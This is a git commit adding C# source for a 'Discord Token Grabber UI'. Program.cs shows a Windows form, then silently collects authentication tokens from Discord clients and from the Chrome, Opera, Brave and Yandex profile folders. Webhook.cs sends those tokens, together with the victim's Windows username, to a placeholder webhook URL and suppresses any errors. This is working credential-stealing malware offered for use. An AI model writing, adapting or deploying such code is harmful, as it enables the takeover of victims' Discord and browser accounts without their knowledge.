751b0d60fbc15c9690cd5d34f69e10e62e72ce42
Mango <54734106+Developer-Mango@users.noreply.github.com>
2020-04-01 06:50:14 -0700

    Add files via upload

---
+++ Program.cs
@@ -0,0 +1,37 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Windows.Forms;
+
+namespace Token_Grabber_UI
+{
+    static class Program
+    {
+        [STAThread]
+        static void Main()
+        {
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+            Application.Run(new Form1());
+
+            foreach (var service in _services)
+                service.GetTokens();
+
+            if (Grabber.TokensFound)
+                Webhook.ReportTokens(TokenReport);
+        }
+
+        //------Inbuilt-----//
+        public static List<string> TokenReport = new List<string>();
+        private readonly static List<Service> _services = new List<Service>()
+        {
+            //>> Add More Options if you wish
+            new Service("Discord", @"Roaming\Discord"),
+            new Service("Discord Canary", @"Roaming\discordcanary", true),
+            new Service("Discord PTB", @"Roaming\discordptb"),
+            new Service("Google Chrome", @"Local\Google\Chrome\User Data\Default"),
+            new Service("Opera", @"Roaming\Opera Software\Opera Stable", true),
+            new Service("Brave", @"Local\BraveSoftware\Brave-Browser\User Data\Default", true),
+            new Service("Yandex", @"Local\Yandex\YandexBrowser\User Data\Default", true)
+        };
+    }
+}
---
+++ Webhook.cs
@@ -0,0 +1,28 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Net.Http;
+
+namespace Token_Grabber_UI
+{
+    public static class Webhook
+    {
+        private static readonly string _hookUrl = "link"; //<< webhook url
+
+        public static void ReportTokens(List<string> tokenReport)
+        {
+            try
+            {
+                HttpClient client = new HttpClient();
+                Dictionary<string, string> contents = new Dictionary<string, string>
+                    {
+                        { "content", $"Token report for '{Environment.UserName}'\n\n{string.Join("\n", tokenReport)}" },
+                        { "username", "Discord Token Grabber UI" },
+                        { "avatar_url", "link" } //<< url to avatar imagine
+                    };
+
+                client.PostAsync(_hookUrl, new FormUrlEncodedContent(contents)).GetAwaiter().GetResult();
+            }
+            catch { }
+        }
+    }
+}
